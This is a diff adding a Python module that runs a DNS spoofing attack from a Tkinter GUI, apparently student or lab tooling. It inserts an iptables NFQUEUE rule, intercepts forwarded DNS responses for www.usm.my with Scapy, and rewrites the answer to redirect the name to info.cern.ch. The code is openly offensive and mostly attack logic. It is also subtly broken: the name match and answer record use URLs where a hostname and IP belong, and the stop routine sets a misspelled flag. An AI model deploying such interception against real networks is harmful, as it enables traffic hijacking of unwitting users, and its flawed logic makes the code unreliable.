@@ -1,0 +1,89 @@
+import subprocess
+from scapy.all import IP, UDP, DNS, DNSQR, DNSRR
+from netfilterqueue import NetfilterQueue
+import threading
+import traceback
+import signal
+
+from tkinter import *
+
+def startDnsSpoofing(terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, colorConfig = "#252525") :
+    global dnsSpoofingIsRunning, dnsSpoofingThreads, terminalLabel, wiresharkLabel, errorOutputLabel
+
+    dnsSpoofingIsRunning = False
+    dnsSpoofingThreads = threading.Thread(target = lambda : dnsSpoofHub())
+
+    terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
+    wiresharkLabel = Label(wiresharkContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
+    errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
+    terminalLabel.configure(bg = colorConfig) 
+    wiresharkLabel.configure(bg = colorConfig)
+    errorOutputLabel.configure(bg = colorConfig)
+
+    terminalLabel["text"] += "$ Running DNS Spoofing Attack...\n\n"
+
+    runDnsSpoofing()
+
+    terminalLabel.pack(anchor = NW)
+    errorOutputLabel.pack(anchor = NW)
+
+def stopDnsSpoofing() :
+    global dnsSpoofingThreads, dnsSpoofingIsRunning
+
+    try:
+        terminalLabel["text"] += "\n$ Stopping DNS Spoofing Attack...\n\n"
+        dnsSpoofingIsrunning = False
+        dnsSpoofingThreads.join(0)
+        dnsSpoofingThreads = None
+
+        #subprocess.Popen.send_signal(signal.SIGINT)
+        subprocess.call(["iptables", "--flush"])
+
+        terminalLabel["text"] += "$ DNS Spoofing Attack successfully stopped!\n"
+    except (AttributeError, RuntimeError):
+        errorOutputLabel["text"] += traceback.format_exc()
+    except Exception as e:
+        errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"
+
+def runDnsSpoofing() :
+    global dnsSpoofingThreads, dnsSpoofingIsRunning
+    dnsSpoofingIsRunning = True
+    dnsSpoofingThreads.start()
+
+def process_packet(packet):
+    # Converting NetfilterQueue packet to a Scapy packet
+    scapy_packet = IP(packet.get_payload())
+    print("TEST 1")
+    # Inspect if it's a DNS Response packet and it's the target website
+    if scapy_packet.haslayer(DNSRR):
+        qname = scapy_packet[DNSQR].qname
+        if b"http://www.usm.my/" in qname:
+            print("[+] Spoofing target")
+            answer = DNSRR(rrname=qname, rdata="http://info.cern.ch/")
+            scapy_packet[DNS].an = answer
+            scapy_packet[DNS].ancount = 1
+
+            # Delete these so Scapy recalculates them
+            del scapy_packet[IP].len
+            del scapy_packet[IP].chksum
+            del scapy_packet[UDP].chksum
+            del scapy_packet[UDP].len
+            
+            # Set the packet's content to our modified version
+            packet.set_payload(str(scapy_packet))
+
+    packet.accept()
+
+def dnsSpoofHub():
+    # Set up IPTables
+    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
+
+    queue_number = 0
+    queue = NetfilterQueue()
+
+    # Bind the queue number to our callback function
+    queue.bind(queue_number, process_packet)
+
+    queue.run()
+
+    print("TEST 3")
